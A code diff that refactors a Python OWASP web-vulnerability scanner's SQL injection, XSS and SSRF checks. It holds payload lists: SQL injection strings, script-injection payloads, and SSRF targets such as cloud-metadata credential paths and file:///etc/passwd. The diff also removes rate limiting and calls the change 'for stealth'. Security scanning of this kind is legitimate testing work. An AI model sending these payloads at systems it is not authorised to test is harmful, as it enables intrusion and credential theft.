@@ -21,41 +21,28 @@ class OWASPScanner:
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
         })
         self.vulnerabilities = []
+        self.cve_results = {}
         
-        # WORKING SQL Injection payloads (simplified but effective)
         self.sql_payloads = [
-            "' OR '1'='1",
-            "' OR 1=1--",
-            "' UNION SELECT NULL,NULL,NULL--",
-            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e))--",
+            "'", "\"", "';", "')", "'))",
+            "' OR 1=1--", "' OR '1'='1",
+            "admin'--", "admin' #",
+            "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
             "'; WAITFOR DELAY '0:0:5'--",
-            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-            "admin'--",
-            "admin' OR '1'='1'--"
+            "1' AND 1=1", "1' AND 1=2"
         ]
         
-        # WORKING XSS payloads
         self.xss_payloads = [
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "<iframe src=\"javascript:alert('XSS')\">",
-            "<body onload=alert('XSS')>",
-            "'\"><script>alert('XSS')</script>",
-            "<script>alert(String.fromCharCode(88,83,83))</script>"
+            "v0marker<", "v0marker\"", "v0marker'",
+            "<script>confirm(1)</script>",
+            "<img src=x onerror=confirm(1)>",
+            "javascript:confirm(1)"
         ]
         
-        # WORKING SSRF payloads
         self.ssrf_payloads = [
+            "http://127.0.0.1:80", "http://localhost:22",
             "http://169.254.169.254/latest/meta-data/",
-            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-            "http://metadata.google.internal/computeMetadata/v1/",
-            "http://127.0.0.1:22",
-            "http://127.0.0.1:80",
-            "http://localhost:3306",
-            "file:///etc/passwd",
-            "file:///etc/hosts"
+            "file:///etc/passwd", "file:///etc/hosts"
         ]
         
         # Default credentials for auth testing
@@ -80,164 +67,109 @@ class OWASPScanner:
             return f"{protocol}://{self.target}:{port}{path}"
 
     def test_sql_injection(self, base_url):
-        """WORKING SQL injection test"""
-        print(f"{Fore.BLUE}[*] Testing SQL Injection on {base_url}...{Style.RESET_ALL}")
+        """Refactored for stealth, early-stop, and no CLI noise"""
         vulnerabilities = []
-        
-        # Test parameters
         test_params = ['id', 'user', 'search', 'q', 'page', 'cat', 'username', 'login']
         
-        # SQL error patterns
         sql_errors = [
-            r"mysql_fetch_array", r"mysql_fetch_assoc", r"Warning.*mysql_.*",
-            r"MySQL server version", r"MySQLSyntaxErrorException",
-            r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"PG::SyntaxError",
-            r"Microsoft.*ODBC.*SQL Server", r"OLE DB.*SQL Server",
-            r"ORA-[0-9][0-9][0-9][0-9][0-9]", r"Oracle error",
-            r"SQLite.*Exception", r"SQLITE_ERROR", r"syntax error"
+            r"mysql_fetch_array", r"MySQL server version", r"PostgreSQL.*ERROR",
+            r"Microsoft.*ODBC.*SQL Server", r"Oracle error", r"syntax error"
         ]
         
         for param in test_params:
+            detected_count = 0
             for payload in self.sql_payloads:
                 try:
                     test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
-                    
                     start_time = time.time()
                     response = self.session.get(test_url, timeout=self.timeout)
                     response_time = time.time() - start_time
                     
-                    # Check for SQL errors
+                    is_vuln = False
+                    # Indicator: SQL error
                     for pattern in sql_errors:
                         if re.search(pattern, response.text, re.IGNORECASE):
-                            vuln = {
-                                'type': 'SQL Injection',
-                                'severity': 'HIGH',
-                                'url': test_url,
-                                'parameter': param,
-                                'payload': payload,
-                                'evidence': f'SQL error pattern: {pattern}',
-                                'remediation': 'Use parameterized queries and input validation.'
-                            }
-                            vulnerabilities.append(vuln)
-                            print(f"{Fore.RED}[!] SQL Injection found: {param} -> {payload[:30]}...{Style.RESET_ALL}")
+                            is_vuln = True
                             break
                     
-                    # Check for time-based injection
-                    if 'SLEEP' in payload or 'WAITFOR' in payload:
+                    # Indicator: Time-based
+                    if not is_vuln and ('SLEEP' in payload or 'WAITFOR' in payload):
                         if response_time > 4:
-                            vuln = {
-                                'type': 'SQL Injection (Time-based)',
+                            is_vuln = True
+                            
+                    if is_vuln:
+                        detected_count += 1
+                        if detected_count >= 2:
+                            vulnerabilities.append({
+                                'type': 'SQL Injection',
                                 'severity': 'HIGH',
-                                'url': test_url,
                                 'parameter': param,
-                                'payload': payload,
-                                'evidence': f'Response time: {response_time:.2f}s',
+                                'confidence': 'High',
                                 'remediation': 'Use parameterized queries and input validation.'
-                            }
-                            vulnerabilities.append(vuln)
-                            print(f"{Fore.RED}[!] Time-based SQL Injection: {param} -> {response_time:.2f}s{Style.RESET_ALL}")
-                    
-                    # Check for union-based injection
-                    if 'UNION' in payload:
-                        union_indicators = ['mysql', 'version', 'database', 'user', 'root@']
-                        if any(indicator in response.text.lower() for indicator in union_indicators):
-                            vuln = {
-                                'type': 'SQL Injection (Union-based)',
-                                'severity': 'HIGH',
-                                'url': test_url,
-                                'parameter': param,
-                                'payload': payload,
-                                'evidence': 'Database information disclosed',
-                                'remediation': 'Use parameterized queries and input validation.'
-                            }
-                            vulnerabilities.append(vuln)
-                            print(f"{Fore.RED}[!] Union-based SQL Injection: {param}{Style.RESET_ALL}")
-                    
-                    time.sleep(0.1)  # Rate limiting
-                    
-                except Exception as e:
+                            })
+                            break # Move to next parameter
+                except:
                     continue
-        
         return vulnerabilities
 
     def test_xss(self, base_url):
-        """WORKING XSS test"""
-        print(f"{Fore.BLUE}[*] Testing XSS on {base_url}...{Style.RESET_ALL}")
+        """Refactored for reflection detection and early-stop"""
         vulnerabilities = []
-        
         test_params = ['q', 'search', 'name', 'comment', 'message', 'input', 'data']
         
         for param in test_params:
+            detected_count = 0
             for payload in self.xss_payloads:
                 try:
                     test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                     response = self.session.get(test_url, timeout=self.timeout)
-                    
-                    # Check if payload is reflected
-                    if (payload in response.text or 
-                        payload.replace('"', '&quot;') in response.text or
-                        payload.replace('<', '&lt;') in response.text):
-                        
-                        vuln = {
-                            'type': 'Cross-Site Scripting (XSS)',
-                            'severity': 'MEDIUM',
-                            'url': test_url,
-                            'parameter': param,
-                            'payload': payload,
-                            'evidence': 'Payload reflected in response',
-                            'remediation': 'Implement input validation and output encoding.'
-                        }
-                        vulnerabilities.append(vuln)
-                        print(f"{Fore.YELLOW}[!] XSS found: {param} -> {payload[:30]}...{Style.RESET_ALL}")
-                        break  # Move to next parameter
-                    
-                    time.sleep(0.1)
-                    
-                except Exception as e:
+                    if payload in response.text:
+                        detected_count += 1
+                        if detected_count >= 2:
+                            vulnerabilities.append({
+                                'type': 'Reflected Input (Potential XSS)',
+                                'severity': 'MEDIUM',
+                                'parameter': param,
+                                'confidence': 'Medium',
+                                'remediation': 'Implement input validation and output encoding.'
+                            })
+                            break
+                except:
                     continue
-        
         return vulnerabilities
 
     def test_ssrf(self, base_url):
-        """WORKING SSRF test"""
-        print(f"{Fore.BLUE}[*] Testing SSRF on {base_url}...{Style.RESET_ALL}")
+        """Refactored for behavior-based detection ONLY"""
         vulnerabilities = []
-        
         ssrf_params = ['url', 'link', 'src', 'source', 'target', 'redirect', 'proxy']
         
         for param in ssrf_params:
+            detected_count = 0
             for payload in self.ssrf_payloads:
                 try:
                     test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
-                    response = self.session.get(test_url, timeout=self.timeout)
+                    start_time = time.time()
+                    try:
+                        response = self.session.get(test_url, timeout=2) # Shorter timeout for SSRF check
+                        duration = time.time() - start_time
+                    except requests.exceptions.Timeout:
+                        duration = 2
                     
-                    # SSRF indicators
-                    ssrf_indicators = [
-                        'ami-id', 'instance-id', 'security-credentials', 'metadata',
-                        'root:x:0:0:', 'daemon:', 'SSH-', 'OpenSSH',
-                        'Connection refused', 'Connection timeout', 'localhost'
-                    ]
-                    
-                    for indicator in ssrf_indicators:
-                        if indicator.lower() in response.text.lower():
-                            vuln = {
+                    # Indicator: Significant delay or timeout
+                    if duration >= 2:
+                        detected_count += 1
+                        if detected_count >= 2:
+                            vulnerabilities.append({
                                 'type': 'Server-Side Request Forgery (SSRF)',
                                 'severity': 'HIGH',
-                                'url': test_url,
                                 'parameter': param,
-                                'payload': payload,
-                                'evidence': f'SSRF indicator: {indicator}',
+                                'confidence': 'Medium',
                                 'remediation': 'Validate and whitelist URLs. Use network segmentation.'
-                            }
-                            vulnerabilities.append(vuln)
-                            print(f"{Fore.RED}[!] SSRF found: {param} -> {payload[:30]}...{Style.RESET_ALL}")
+                            })
                             break
-                    
-                    time.sleep(0.2)
-                    
-                except Exception as e:
+                except:
                     continue
-        
+            if vulnerabilities: break # Group SSRF into ONE finding maximum
         return vulnerabilities
 
     def test_security_misconfig(self, base_url):
